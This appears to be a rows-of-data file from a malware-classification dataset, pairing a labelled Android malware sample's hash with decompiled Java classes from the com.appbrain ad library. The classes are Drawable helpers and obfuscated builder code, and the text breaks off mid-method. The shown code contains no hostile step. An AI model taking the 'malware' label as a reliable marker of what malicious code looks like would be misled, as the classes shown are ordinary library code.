"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.d\d.code","public final class d extends c {   final Drawable a;   public d(  Drawable[] drawableArr,  float[] fArr,  Drawable drawable){     super(drawableArr,fArr);     this.a=drawable;   }   @Override public final void draw(  Canvas canvas){     this.a.draw(canvas);     super.draw(canvas);   }   @Override public final void setBounds(  int i,  int i2,  int i3,  int i4){     this.a.setBounds(i,i2,i3,i4);     super.setBounds(i,i2,i3,i4);   }   @Override public final void setBounds(  Rect rect){     this.a.setBounds(rect);     super.setBounds(rect);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.d\e.code","final class e extends Drawable {   ColorFilter a;   Paint b=new Paint();   RectF c=null;   final Drawable d;   public e(  Drawable drawable){     this.d=drawable;   }   @Override public final void draw(  Canvas canvas){     int saveLayer=canvas.saveLayer(this.c,this.b,31);     this.d.draw(canvas);     canvas.restoreToCount(saveLayer);   }   @Override public final int getIntrinsicHeight(){     return this.d.getIntrinsicHeight();   }   @Override public final int getIntrinsicWidth(){     return this.d.getIntrinsicWidth();   }   @Override public final int getMinimumHeight(){     return this.d.getMinimumHeight();   }   @Override public final int getMinimumWidth(){     return this.d.getMinimumWidth();   }   @Override public final int getOpacity(){     return -3;   }   @Override public final boolean getPadding(  Rect rect){     return this.d.getPadding(rect);   }   @Override protected final void onBoundsChange(  Rect rect){     super.onBoundsChange(rect);     this.c=new RectF(rect);     this.d.setBounds(rect);   }   @Override public final void setAlpha(  int i){   }   @Override public final void setColorFilter(  ColorFilter colorFilter){     this.a=colorFilter;     this.b.setColorFilter(colorFilter);     invalidateSelf();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.d\f.code","public final class f {   private static final int[] a={-16842908,R.attr.state_selected,-16842919};   private static final int[] b={R.attr.state_pressed};   public static Drawable a(  Drawable drawable,  Resources resources){     Drawable newDrawable=drawable.getConstantState().newDrawable(resources);     try {       newDrawable.mutate();     }  catch (    NullPointerException e) {     }     return newDrawable;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.d\g.code","public class g extends Drawable {   private Bitmap a;   private Paint b;   public g(  int i,  int i2){     this.a=null;     this.a=Bitmap.createBitmap(5,5,Bitmap.Config.ARGB_8888);     Canvas canvas=new Canvas(this.a);     canvas.drawColor(i);     Paint paint=new Paint();     paint.setColor(i2);     paint.setStrokeWidth(1.0f);     canvas.drawLine(0.0f,5.0f,5.0f,0.0f,paint);     this.b=new Paint();     this.b.setShader(new BitmapShader(this.a,Shader.TileMode.REPEAT,Shader.TileMode.REPEAT));   }   @Override public void draw(  Canvas canvas){     canvas.drawPaint(this.b);   }   @Override public int getOpacity(){     return -1;   }   @Override public void setAlpha(  int i){   }   @Override public void setColorFilter(  ColorFilter colorFilter){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.d\h.code","public final class h extends LevelListDrawable {   private Context a;   private int b;   private Runnable c;   private int d=0;   public h(  Context context,  String str){     this.a=context;     addLevel(0,2,new ColorDrawable(0));     this.b=1;     setLevel(1);     aj.a(null,str,new i(this));   }   public static int b(  h hVar){     hVar.b=10;     return 10;   }   @Override protected final boolean onLevelChange(  int i){     if (i != this.b) {       setLevel(this.b);     }     return super.onLevelChange(this.b);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.d\i.code","public final class i implements aa {   final h a;   public i(  h hVar){     this.a=hVar;   }   @Override public final void a(  Object obj){     Context context;     Runnable runnable;     Runnable runnable2;     h hVar=this.a;     context=this.a.a;     hVar.addLevel(9,11,new BitmapDrawable(context.getResources(),(Bitmap)obj));     h.b(this.a);     this.a.setLevel(10);     runnable=this.a.c;     if (runnable != null) {       runnable2=this.a.c;       runnable2.run();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\a.code","!org.eclipse.jdt.core.dom.TypeDeclaration@192b9521!org.eclipse.jdt.core.dom.TypeDeclaration@2baa145public static final class a extends g.a implements c {   private int a;   private boolean j;   private com.appbrain.b.k b=com.appbrain.b.j.a;   private com.appbrain.b.k c=com.appbrain.b.j.a;   private com.appbrain.b.k d=com.appbrain.b.j.a;   private com.appbrain.b.k e=com.appbrain.b.j.a;   private com.appbrain.b.k f=com.appbrain.b.j.a;   private com.appbrain.b.k g=com.appbrain.b.j.a;   private List h=Collections.emptyList();   private Object i="""";   private com.appbrain.b.k k=com.appbrain.b.j.a;   private List l=Collections.emptyList();   private a(){   }   static a d(){     return new a();   }   @Override public a clone(){     return new a().a(g());   }   private b g(){     b bVar=new b((char)0);     int i=this.a;     if ((this.a & 1) == 1) {       this.b=new com.appbrain.b.r(this.b);       this.a&=-2;     }     bVar.d=this.b;     if ((this.a & 2) == 2) {       this.c=new com.appbrain.b.r(this.c);       this.a&=-3;     }     bVar.e=this.c;     if ((this.a & 4) == 4) {       this.d=new com.appbrain.b.r(this.d);       this.a&=-5;     }     bVar.f=this.d;     if ((this.a & 8) == 8) {       this.e=new com.appbrain.b.r(this.e);       this.a&=-9;     }     bVar.g=this.e;     if ((this.a & 16) == 16) {       this.f=new com.appbrain.b.r(this.f);       this.a&=-17;     }     bVar.h=this.f;     if ((this.a & 32) == 32) {       this.g=new com.appbrain.b.r(this.g);       this.a&=-33;     }     bVar.i=this.g;     if ((this.a & 64) == 64) {       this.h=Collections.unmodifiableList(this.h);       this.a&=-65;     }     bVar.j=this.h;     int i2=(i & android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS) != 128 ? 0 : 1;     bVar.k=this.i;     if ((i & android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY) == 256) {       i2|=2;     }     bVar.l=this.j;     if ((this.a & android.support.v4.view.a.a.ACTION_PREVIOUS_AT_MOVEMENT_GRANULARITY) == 512) {       this.k=new com.appbrain.b.r(this.k);       this.a&=-513;     }     bVar.m=this.k;     if ((this.a & android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT) == 1024) {       this.l=Collections.unmodifiableList(this.l);       this.a&=-1025;     }     bVar.n=this.l;     bVar.c=i2;     return bVar;   }   public final a a(  b bVar){     if (bVar != b.f()) {       if (!bVar.d.isEmpty()) {         if (this.b.isEmpty()) {           this.b=bVar.d;           this.a&=-2;         }  else {           if ((this.a & 1) != 1) {             this.b=new com.appbrain.b.j(this.b);             this.a|=1;           }           this.b.addAll(bVar.d);         }       }       if (!bVar.e.isEmpty()) {         if (this.c.isEmpty()) {           this.c=bVar.e;           this.a&=-3;         }  else {           if ((this.a & 2) != 2) {             this.c=new com.appbrain.b.j(this.c);             this.a|=2;           }           this.c.addAll(bVar.e);         }       }       if (!bVar.f.isEmpty()) {         if (this.d.isEmpty()) {           this.d=bVar.f;           this.a&=-5;         }  else {           if ((this.a & 4) != 4) {             this.d=new com.appbrain.b.j(this.d);             this.a|=4;           }           this.d.addAll(bVar.f);         }       }       if (!bVar.g.isEmpty()) {         if (this.e.isEmpty()) {           this.e=bVar.g;           this.a&=-9;         }  else {           if ((this.a & 8) != 8) {             this.e=new com.appbrain.b.j(this.e);             this.a|=8;           }           this.e.addAll(bVar.g);         }       }       if (!bVar.h.isEmpty()) {         if (this.f.isEmpty()) {           this.f=bVar.h;           this.a&=-17;         }  else {           if ((this.a & 16) != 16) {             this.f=new com.appbrain.b.j(this.f);             this.a|=16;           }           this.f.addAll(bVar.h);         }       }       if (!bVar.i.isEmpty()) {         if (this.g.isEmpty()) {           this.g=bVar.i;           this.a&=-33;         }  else {           if ((this.a & 32) != 32) {             this.g=new com.appbrain.b.j(this.g);             this.a|=32;           }           this.g.addAll(bVar.i);         }       }       if (!bVar.j.isEmpty()) {         if (this.h.isEmpty()) {           this.h=bVar.j;           this.a&=-65;         }  else {           if ((this.a & 64) != 64) {             this.h=new ArrayList(this.h);             this.a|=64;           }           this.h.addAll(bVar.j);         }       }       if (bVar.h()) {         this.a|=android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS;         this.i=bVar.k;       }       if (bVar.j()) {         boolean k=bVar.k();         this.a|=android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY;         this.j=k;       }       if (!bVar.m.isEmpty()) {         if (this.k.isEmpty()) {           this.k=bVar.m;           this.a&=-513;         }  else {           if ((this.a & android.support.v4.view.a.a.ACTION_PREVIOUS_AT_MOVEMENT_GRANULARITY) != 512) {             this.k=new com.appbrain.b.j(this.k);             this.a|=android.support.v4.view.a.a.ACTION_PREVIOUS_AT_MOVEMENT_GRANULARITY;           }           this.k.addAll(bVar.m);         }       }       if (!bVar.n.isEmpty()) {         if (this.l.isEmpty()) {           this.l=bVar.n;           this.a&=-1025;         }  else {           if ((this.a & android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT) != 1024) {             this.l=new ArrayList(this.l);             this.a|=android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT;           }           this.l.addAll(bVar.n);         }       }     }     return this;   }   @Override public final com.appbrain.b.m c(){     b g=g();     if (g.e()) {       return g;     }     throw new com.appbrain.b.q();   }   @Override public final boolean e(){     return true;   } } public static final class a extends g.a implements e {   private int a;   private long c;   private Object b="""";   private com.appbrain.b.k d=com.appbrain.b.j.a;   private a(){   }   static a d(){     return new a();   }   @Override public a clone(){     return new a().a(g());   }   private d g(){     d dVar=new d((char)0);     int i=this.a;     int i2=(i & 1) != 1 ? 0 : 1;     dVar.d=this.b;     if ((i & 2) == 2) {       i2|=2;     }     dVar.e=this.c;     if ((this.a & 4) == 4) {       this.d=new com.appbrain.b.r(this.d);       this.a&=-5;     }     dVar.f=this.d;     dVar.c=i2;     return dVar;   }   public final a a(  d dVar){     if (dVar != d.f()) {       if (dVar.g()) {         this.a|=1;         this.b=dVar.d;       }       if (dVar.i()) {         long j=dVar.j();         this.a|=2;         this.c=j;       }       if (!dVar.f.isEmpty()) {         if (this.d.isEmpty()) {           this.d=dVar.f;           this.a&=-5;         }  else {           if ((this.a & 4) != 4) {             this.d=new com.appbrain.b.j(this.d);             this.a|=4;           }           this.d.addAll(dVar.f);         }       }     }     return this;   }   @Override public final com.appbrain.b.m c(){     d g=g();     if (g.e()) {       return g;     }     throw new com.appbrain.b.q();   }   @Override public final boolean e(){     return true;   } } public static final class a extends g.a implements g {   private int a;   private int c;   private int d;   private int f;   private boolean g;   private h.a b=h.a.f();   private h e=h.UNKNOWN_SOURCE;   private Object h="""";   private a(){   }   static a f(){     return new a();   }   @Override public a clone(){     return new a().a(h());   }   private f h(){     f fVar=new f((char)0);     int i=this.a;     int i2=(i & 1) != 1 ? 0 : 1;     fVar.d=this.b;     if ((i & 2) == 2) {       i2|=2;     }     fVar.e=this.c;     if ((i & 4) == 4) {       i2|=4;     }     fVar.f=this.d;     if ((i & 8) == 8) {       i2|=8;     }     fVar.g=this.e;     if ((i & 16) == 16) {       i2|=16;     }     fVar.h=this.f;     if ((i & 32) == 32) {       i2|=32;     }     fVar.i=this.g;     if ((i & 64) == 64) {       i2|=64;     }     fVar.j=this.h;     fVar.c=i2;     return fVar;   }   public final a a(  int i){     this.a|=2;     this.c=i;     return this;   }   public final a a(  h.a aVar){     if (aVar == null) {       throw new NullPointerException();     }     this.b=aVar;     this.a|=1;     return this;   }   public final a a(  f fVar){     if (fVar != f.f()) {       if (fVar.g()) {         h.a h=fVar.h();         if ((this.a & 1) != 1 || this.b == h.a.f()) {           this.b=h;         }  else {           this.b=h.a.a(this.b).a(h).f();         }         this.a|=1;       }       if (fVar.i()) {         a(fVar.j());       }       if (fVar.k()) {         b(fVar.l());       }       if (fVar.m()) {         a(fVar.n());       }       if (fVar.o()) {         c(fVar.p());       }       if (fVar.q()) {         a(fVar.r());       }       if (fVar.s()) {         this.a|=64;         this.h=fVar.j;       }     }     return this;   }   public final a a(  h hVar){     if (hVar == null) {       throw new NullPointerException();     }     this.a|=8;     this.e=hVar;     return this;   }   public final a a(  String str){     if (str == null) {       throw new NullPointerException();     }     this.a|=64;     this.h=str;     return this;   }   public final a a(  boolean z){     this.a|=32;     this.g=z;     return this;   }   public final a b(  int i){     this.a|=4;     this.d=i;     return this;   }   public final a c(  int i){     this.a|=16;     this.f=i;     return this;   }   @Override public final f c(){     f h=h();     if (h.e()) {       return h;     }     throw new com.appbrain.b.q();   }   @Override public final boolean e(){     return true;   } } public static final class a extends g.a implements InterfaceC0017j {   private int a;   private long e;   private long f;   private boolean i;   private int j;   private h.a b=h.a.f();   private Object c="""";   private a d=a.SELECT;   private Object g="""";   private Object h="""";   private a(){   }   static a g(){     return new a();   }   @Override public a clone(){     return new a().a(f());   }   public final a a(  int i){     this.a|=android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY;     this.j=i;     return this;   }   public final a a(  long j){     this.a|=8;     this.e=j;     return this;   }   public final a a(  h.a aVar){     if (aVar == null) {       throw new NullPointerException();     }     this.b=aVar;     this.a|=1;     return this;   }   public final a a(  a aVar){     if (aVar == null) {       throw new NullPointerException();     }     this.a|=4;     this.d=aVar;     return this;   }   public final a a(  i iVar){     if (iVar != i.f()) {       if (iVar.g()) {         h.a h=iVar.h();         if ((this.a & 1) != 1 || this.b == h.a.f()) {           this.b=h;         }  else {           this.b=h.a.a(this.b).a(h).f();         }         this.a|=1;       }       if (iVar.i()) {         this.a|=2;         this.c=iVar.e;       }       if (iVar.k()) {         a(iVar.l());       }       if (iVar.m()) {         a(iVar.n());       }       if (iVar.o()) {         b(iVar.p());       }       if (iVar.q()) {         this.a|=32;         this.g=iVar.i;       }       if (iVar.r()) {         this.a|=64;         this.h=iVar.j;       }       if (iVar.t()) {         a(iVar.u());       }       if (iVar.v()) {         a(iVar.w());       }     }     return this;   }   public final a a(  String str){     if (str == null) {       throw new NullPointerException();     }     this.a|=2;     this.c=str;     return this;   }   public final a a(  boolean z){     this.a|=android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS;     this.i=z;     return this;   }   public final a b(  long j){     this.a|=16;     this.f=j;     return this;   }   public final a b(  String str){     if (str == null) {       throw new NullPointerException();     }     this.a|=32;     this.g=str;     return this;   }   public final a c(  String str){     if (str == null) {       throw new NullPointerException();     }     this.a|=64;     this.h=str;     return this;   }   @Override public final i c(){     i f=f();     if (f.e()) {       return f;     }     throw new com.appbrain.b.q();   }   @Override public final boolean e(){     return true;   }   public final i f(){     i iVar=new i((char)0);     int i=this.a;     int i2=(i & 1) != 1 ? 0 : 1;     iVar.d=this.b;     if ((i & 2) == 2) {       i2|=2;     }     iVar.e=this.c;     if ((i & 4) == 4) {       i2|=4;     }     iVar.f=this.d;     if ((i & 8) == 8) {       i2|=8;     }     iVar.g=this.e;     if ((i & 16) == 16) {       i2|=16;     }     iVar.h=this.f;     if ((i & 32) == 32) {       i2|=32;     }     iVar.i=this.g;     if ((i & 64) == 64) {       i2|=64;     }     iVar.j=this.h;     if ((i & android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS) == 128) {       i2|=android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS;     }     iVar.k=this.i;     if ((i & android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY) == 256) {       i2|=android.support.v4.view.a.a.ACTION_NEXT_AT_MOVEMENT_GRANULARITY;     }     iVar.l=this.j;     iVar.c=i2;     return iVar;   } } public static final class a extends g.a implements l {   private int a;   private h.a b=h.a.f();   private com.appbrain.b.k c=com.appbrain.b.j.a;   private com.appbrain.b.k d=com.appbrain.b.j.a;   private Object e="""";   private a(){   }   static a f(){     return new a();   }   @Override public a clone(){     return new a().a(h());   }   private k h(){     k kVar=new k((char)0);     int i=this.a;     int i2=(i & 1) != 1 ? 0 : 1;     kVar.d=this.b;     if ((this.a & 2) == 2) {       this.c=new com.appbrain.b.r(this.c);       this.a&=-3;     }     kVar.e=this.c;     if ((this.a & 4) == 4) {       this.d=new com.appbrain.b.r(this.d);       this.a&=-5;     }     kVar.f=this.d;     if ((i & 8) == 8) {       i2|=2;     }     kVar.g=this.e;     kVar.c=i2;     return kVar;   }   private void i(){     if ((this.a & 2) != 2) {       this.c=new com.appbrain.b.j(this.c);       this.a|=2;     }   }   private void j(){     if ((this.a & 4) != 4) {       this.d=new com.appbrain.b.j(this.d);       this.a|=4;     }   }   public final a a(  h.a aVar){     if (aVar == null) {       throw new NullPointerException();     }     this.b=aVar;     this.a|=1;     return this;   }   public final a a(  k kVar){     if (kVar != k.f()) {       if (kVar.g()) {         h.a h=kVar.h();         if ((this.a & 1) != 1 || this.b == h.a.f()) {           this.b=h;         }  else {           this.b=h.a.a(this.b).a(h).f();         }         this.a|=1;       }       if (!kVar.e.isEmpty()) {         if (this.c.isEmpty()) {           this.c=kVar.e;           this.a&=-3;         }  else {           i();           this.c.addAll(kVar.e);         }       }       if (!kVar.f.isEmpty()) {         if (this.d.isEmpty()) {           this.d=kVar.f;           this.a&=-5;         }  else {           j();           this.d.addAll(kVar.f);         }       }       if (kVar.i()) {         this.a|=8;         this.e=kVar.g;       }     }     return this;   }   public final a a(  String str){     if (str == null) {       throw new NullPointerException();     }     i();     this.c.add(str);     return this;   }   public final a b(  String str){     if (str == null) {       throw new NullPointerException();     }     j();     this.d.add(str);     return this;   }   public final a c(  String str){     if (str == null) {       throw new NullPointerException();     }     this.a|=8;     this.e=str;     return this;   }   @Override public final k c(){     k h=h();     if (h.e()) {       return h;     }     throw new com.appbrain.b.q();   }   @Override public final boolean e(){     return true;   } } public static final class a extends g.a implements n {   private int a;   private i b=i.f();   private boolean c;   private int d;   private a(){   }   static a f(){     return new a();   }   @Override public a clone(){     return new a().a(i());   }   private m i(){     m mVar=new m((char)0);     int i=this.a;     int i2=(i & 1) != 1 ? 0 : 1;     mVar.d=this.b;     if ((i & 2) == 2) {       i2|=2;     }     mVar.e=this.c;     if ((i & 4) == 4) {       i2|=4;     }     mVar.f=this.d;     mVar.c=i2;     return mVar;   }   public final a a(  int i){     this.a|=4;     this.d=i;     return this;   }   public final a a(  i.a aVar){     this.b=aVar.c();     this.a|=1;     return this;   }   public final a a(  m mVar){     if (mVar != m.f()) {       if (mVar.g()) {         i h=mVar.h();         if ((this.a & 1) != 1 || this.b == i.f()) {           this.b=h;         }  else {           this.b=i.a(this.b).a(h).f();         }         this.a|=1;       }       if (mVar.i()) {         a(mVar.j());       }       if (mVar.k()) {         a(mVar.l());       }     }     return this;   }   public final a a(  boolean z){     this.a|=2;     this.c=z;     return this;   }   @Override public final m c(){     m i=i();     if (i.e()) {       return i;     }     throw new com.appbrain.b.q();   }   @Override public final boolean e(){     return true;   }   @Override public final i h(){     return this.b;   }   @Override public final int l(){     return this.d;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\b.code","public interface b extends com.appbrain.b.n { } final class b extends com.appbrain.b.b {   @Override public final Object a(  com.appbrain.b.d dVar,  com.appbrain.b.f fVar){     return new a.C0009a(dVar,(byte)0);   } } public interface b extends com.appbrain.b.n { } !org.eclipse.jdt.core.dom.TypeDeclaration@f390329"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\c.code","!org.eclipse.jdt.core.dom.TypeDeclaration@4ba20f10final class c extends com.appbrain.b.b {   @Override public final Object a(  com.appbrain.b.d dVar,  com.appbrain.b.f fVar){     return new a.c(dVar,(byte)0);   } } public interface c extends com.appbrain.b.n { } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\C0009a.code","!org.eclipse.jdt.core.dom.TypeDeclaration@24f2cf80"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\C0010a.code","public static final class C0010a extends g.a implements b {   private int a;   private int b;   private int c;   private Object d="""";   private C0010a(){   }   static C0010a f(){     return new C0010a();   }   @Override public C0010a clone(){     return new C0010a().a(h());   }   private C0009a h(){     C0009a c0009a=new C0009a((char)0);     int i=this.a;     int i2=(i & 1) != 1 ? 0 : 1;     c0009a.d=this.b;     if ((i & 2) == 2) {       i2|=2;     }     c0009a.e=this.c;     if ((i & 4) == 4) {       i2|=4;     }     c0009a.f=this.d;     c0009a.c=i2;     return c0009a;   }   public final C0010a a(  int i){     this.a|=2;     this.c=i;     return this;   }   public final C0010a a(  C0009a c0009a){     if (c0009a != C0009a.f()) {       if (c0009a.g()) {         int h=c0009a.h();         this.a|=1;         this.b=h;       }       if (c0009a.i()) {         a(c0009a.j());       }       if (c0009a.k()) {         this.a|=4;         this.d=c0009a.f;       }     }     return this;   }   public final C0010a a(  String str){     if (str == null) {       throw new NullPointerException();     }     this.a|=4;     this.d=str;     return this;   }   @Override public final C0009a c(){     C0009a h=h();     if (h.e()) {       return h;     }     throw new com.appbrain.b.q();   }   @Override public final boolean e(){     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\C0011a.code","public static final class C0011a extends g.a implements d {   private int a;   private Object b="""";   private int c;   private long d;   private C0011a(){   }   static C0011a f(){     return new C0011a();   }   @Override public C0011a clone(){     return new C0011a().a(h());   }   private c h(){     c cVar=new c((char)0);     int i=this.a;     int i2=(i & 1) != 1 ? 0 : 1;     cVar.d=this.b;     if ((i & 2) == 2) {       i2|=2;     }     cVar.e=this.c;     if ((i & 4) == 4) {       i2|=4;     }     cVar.f=this.d;     cVar.c=i2;     return cVar;   }   public final C0011a a(  int i){     this.a|=2;     this.c=i;     return this;   }   public final C0011a a(  long j){     this.a|=4;     this.d=j;     return this;   }   public final C0011a a(  c cVar){     if (cVar != c.f()) {       if (cVar.g()) {         this.a|=1;         this.b=cVar.d;       }       if (cVar.h()) {         a(cVar.i());       }       if (cVar.j()) {         a(cVar.k());       }     }     return this;   }   public final C0011a a(  String str){     if (str == null) {       throw new NullPointerException();     }     this.a|=1;     this.b=str;     return this;   }   @Override public final c c(){     c h=h();     if (h.e()) {       return h;     }     throw new com.appbrain.b.q();   }   @Override public final boolean e(){     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\C0012a.code","public static final class C0012a extends g.a implements f {   private int a;   private g b=g.f();   private C0012a(){   }   static C0012a d(){     return new C0012a();   }   @Override public C0012a clone(){     return new C0012a().a(g());   }   private e g(){     e eVar=new e((char)0);     int i=(this.a & 1) != 1 ? 0 : 1;     eVar.d=this.b;     eVar.c=i;     return eVar;   }   public final C0012a a(  e eVar){     if (eVar != e.f() && eVar.g()) {       g h=eVar.h();       if ((this.a & 1) != 1 || this.b == g.f()) {         this.b=h;       }  else {         this.b=g.a(this.b).a(h).d();       }       this.a|=1;     }     return this;   }   @Override public final com.appbrain.b.m c(){     e g=g();     if (g.e()) {       return g;     }     throw new com.appbrain.b.q();   }   @Override public final boolean e(){     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\C0013a.code","public static final class C0013a extends g.a implements h {   private int a;   private List b=Collections.emptyList();   private List c=Collections.emptyList();   private boolean d;   private boolean e;   private C0013a(){   }   static C0013a f(){     return new C0013a();   }   @Override public C0013a clone(){     return new C0013a().a(d());   }   public final C0013a a(  g gVar){     if (gVar != g.f()) {       if (!gVar.d.isEmpty()) {         if (this.b.isEmpty()) {           this.b=gVar.d;           this.a&=-2;         }  else {           if ((this.a & 1) != 1) {             this.b=new ArrayList(this.b);             this.a|=1;           }           this.b.addAll(gVar.d);         }       }       if (!gVar.e.isEmpty()) {         if (this.c.isEmpty()) {           this.c=gVar.e;           this.a&=-3;         }  else {           if ((this.a & 2) != 2) {             this.c=new ArrayList(this.c);             this.a|=2;           }           this.c.addAll(gVar.e);         }       }       if (gVar.k()) {         boolean l=gVar.l();         this.a|=4;         this.d=l;       }       if (gVar.m()) {         boolean n=gVar.n();         this.a|=8;         this.e=n;       }     }     return this;   }   @Override public final com.appbrain.b.m c(){     g d=d();     if (d.e()) {       return d;     }     throw new com.appbrain.b.q();   }   public final g d(){     g gVar=new g((char)0);     int i=this.a;     if ((this.a & 1) == 1) {       this.b=Collections.unmodifiableList(this.b);       this.a&=-2;     }     gVar.d=this.b;     if ((this.a & 2) == 2) {       this.c=Collections.unmodifiableList(this.c);       this.a&=-3;     }     gVar.e=this.c;     int i2=(i & 4) != 4 ? 0 : 1;     gVar.f=this.d;     if ((i & 8) == 8) {       i2|=2;     }     gVar.g=this.e;     gVar.c=i2;     return gVar;   }   @Override public final boolean e(){     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\C0014a.code","public static final class C0014a extends g.a implements j {   private int a;   private Object b="""";   private Object c="""";   private boolean d;   private C0014a(){   }   static C0014a d(){     return new C0014a();   }   @Override public C0014a clone(){     return new C0014a().a(g());   }   private i g(){     i iVar=new i((char)0);     int i=this.a;     int i2=(i & 1) != 1 ? 0 : 1;     iVar.d=this.b;     if ((i & 2) == 2) {       i2|=2;     }     iVar.e=this.c;     if ((i & 4) == 4) {       i2|=4;     }     iVar.f=this.d;     iVar.c=i2;     return iVar;   }   public final C0014a a(  i iVar){     if (iVar != i.f()) {       if (iVar.g()) {         this.a|=1;         this.b=iVar.d;       }       if (iVar.i()) {         this.a|=2;         this.c=iVar.e;       }       if (iVar.k()) {         boolean l=iVar.l();         this.a|=4;         this.d=l;       }     }     return this;   }   @Override public final com.appbrain.b.m c(){     i g=g();     if (g.e()) {       return g;     }     throw new com.appbrain.b.q();   }   @Override public final boolean e(){     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\C0015a.code","public static final class C0015a extends g.a implements l {   private int a;   private boolean c;   private boolean e;   private h.a b=h.a.f();   private List d=Collections.emptyList();   private List f=Collections.emptyList();   private C0015a(){   }   static C0015a g(){     return new C0015a();   }   @Override public C0015a clone(){     return new C0015a().a(i());   }   private k i(){     k kVar=new k((char)0);     int i=this.a;     int i2=(i & 1) != 1 ? 0 : 1;     kVar.d=this.b;     if ((i & 2) == 2) {       i2|=2;     }     kVar.e=this.c;     if ((this.a & 4) == 4) {       this.d=Collections.unmodifiableList(this.d);       this.a&=-5;     }     kVar.f=this.d;     if ((i & 8) == 8) {       i2|=4;     }     kVar.g=this.e;     if ((this.a & 16) == 16) {       this.f=Collections.unmodifiableList(this.f);       this.a&=-17;     }     kVar.h=this.f;     kVar.c=i2;     return kVar;   }   private void j(){     if ((this.a & 4) != 4) {       this.d=new ArrayList(this.d);       this.a|=4;     }   }   private void k(){     if ((this.a & 16) != 16) {       this.f=new ArrayList(this.f);       this.a|=16;     }   }   public final C0015a a(  C0009a.C0010a c0010a){     j();     this.d.add(c0010a.c());     return this;   }   public final C0015a a(  c cVar){     if (cVar == null) {       throw new NullPointerException();     }     k();     this.f.add(cVar);     return this;   }   public final C0015a a(  k kVar){     if (kVar != k.f()) {       if (kVar.g()) {         h.a h=kVar.h();         if ((this.a & 1) != 1 || this.b == h.a.f()) {           this.b=h;         }  else {           this.b=h.a.a(this.b).a(h).f();         }         this.a|=1;       }       if (kVar.i()) {         boolean j=kVar.j();         this.a|=2;         this.c=j;       }       if (!kVar.f.isEmpty()) {         if (this.d.isEmpty()) {           this.d=kVar.f;           this.a&=-5;         }  else {           j();           this.d.addAll(kVar.f);         }       }       if (kVar.k()) {         a(kVar.l());       }       if (!kVar.h.isEmpty()) {         if (this.f.isEmpty()) {           this.f=kVar.h;           this.a&=-17;         }  else {           k();           this.f.addAll(kVar.h);         }       }     }     return this;   }   public final C0015a a(  h.a aVar){     if (aVar == null) {       throw new NullPointerException();     }     this.b=aVar;     this.a|=1;     return this;   }   public final C0015a a(  Iterable iterable){     k();     g.a.a(iterable,this.f);     return this;   }   public final C0015a a(  boolean z){     this.a|=8;     this.e=z;     return this;   }   @Override public final k c(){     k i=i();     if (i.e()) {       return i;     }     throw new com.appbrain.b.q();   }   @Override public final boolean e(){     return true;   }   public final int f(){     return this.f.size();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.e\C0016a.code","public static final class C0016a extends g.a implements b {   private int A;   private int B;   private int C;   private int D;   private int E;   private int F;   private int H;   private int L;   private int M;   private long N;   private int a;   private int b;   private long c;   private long d;   private int l;   private int m;   private int u;   private int w;   private int x;   private long y;   private int z;   private Object e="""";   private Object f="""";   private Object g="""";   private Object h="""";   private Object i="""";   private Object j="""";   private Object k="""";   private Object n="""";   private Object o="""";   private Object p="""";   private Object q="""";   private Object r="""";   private Object s="""";   private Object t="""";   private Object v="""";   private Object G="""";   private Object I="""";   private com.appbrain.b.c J=com.appbrain.b.c.a;   private com.appbrain.b.c K=com.appbrain.b.c.a;   private C0016a(){   }   static C0016a g(){     return new C0016a();   }   @Override public C0016a clone(){     return new C0016a().a(f());   }   public final C0016a a(  int i){     